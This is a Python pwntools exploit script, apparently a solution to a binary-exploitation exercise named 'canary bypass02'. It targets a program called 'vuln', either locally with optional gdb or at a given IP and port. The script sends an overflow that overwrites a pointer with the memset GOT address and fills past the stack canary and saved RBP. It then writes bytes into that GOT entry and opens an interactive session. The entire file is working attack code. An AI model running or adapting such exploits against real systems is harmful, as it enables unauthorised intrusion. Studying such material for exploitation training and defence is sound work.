#!/usr/bin/env python3

# author: greyshell
# description: exploit canary bypass02
# python canary_bypass02_exploit_v01.py -m true local -b vuln -g true

import argparse

from pwn import *

context(os='linux', arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']  # run the local binary in tmux session


class MyUtils:
    def __init__(self):
        # create the top-level parser
        self.parser = argparse.ArgumentParser(
            description="linux binary exploitation")

        # optional arguments
        self.parser.add_argument("-m", "--debug_mode", metavar="", choices=["true", "false"],
                                 help="enable the debug mode, choices = {true, false}, default=false")

        # based on the dest argument subparsers will be selected
        self.subparsers = self.parser.add_subparsers(title="commands", dest="command",
                                                     help="[command] --help for more details")

        # create a sub parser for the local binary
        self.local_parser = self.subparsers.add_parser("local", description="exploit local binary",
                                                       help="exploit local binary")
        self.local_parser.add_argument("-b", "--binary", metavar="",
                                       help="provide the binary kept in the same directory",
                                       required=True)
        self.local_parser.add_argument("-g", "--gdb", metavar="", choices=['true', 'false'],
                                       help="attach gdb in tmux session, choices = {true, false}, default=false")
        self.local_parser.set_defaults(func='local')

        # create a sub parser for the binary running on network
        self.local_parser = self.subparsers.add_parser("network", description="exploit network binary",
                                                       help="exploit network binary")
        self.local_parser.add_argument("-i", "--ip_address", metavar="",
                                       help="provide ip_address",
                                       required=True)
        self.local_parser.add_argument("-p", "--port", metavar="",
                                       help="provide port",
                                       required=True)
        self.local_parser.set_defaults(func='network')


def exploit(conn):
    """
    exploit code
    :param conn:
    :return:
    """
    conn.recvuntil("name:\n")  # receive bytes till name:
    input_name = "A" * 24  # sendline() will add \n at the end
    # we can't overwrite the heap pointer with "C" because program will not find this address
    input_name += p64(0x601028).decode()  # here we need to provide any valid writable address = i.e memset GOT 0x601028
    input_name += "D" * 8  # overwrite the 8 byte pad address
    input_name += "E" * 8  # overwrite the 8 bytes canary
    input_name += "F" * 7  # RBP: 7 bytes other buffer
    conn.sendline(input_name)  # \n will be added in the last and it will be treated as null byte

    conn.recvuntil("description:\n")  # receive bytes till description:
    # writing 7 Bs at 0x601028 (memset@got)
    input_des = "B" * 7  # sendline() will add \n at the end
    conn.sendline(input_des)

    # make the connection interactive
    conn.interactive()


def main():
    my_input = MyUtils()
    arguments = my_input.parser.parse_args()
    connection = ""

    # run the script without any argument
    if len(sys.argv) == 1:
        my_input.parser.print_help(sys.stderr)
        sys.exit(1)

    # exploiting local binary
    if arguments.command == 'local':
        binary_name = "./"
        binary_name += arguments.binary
        connection = process([binary_name])
        # attach the binary with gdb in tmux session
        if arguments.gdb == 'true':
            gdb.attach(connection)

    elif arguments.command == 'network':
        connection = remote(arguments.ip_address, arguments.port)

    if arguments.debug_mode == 'true':
        context.log_level = 'debug'

    # invoke the exploit function
    exploit(connection)


if __name__ == '__main__':
    main()
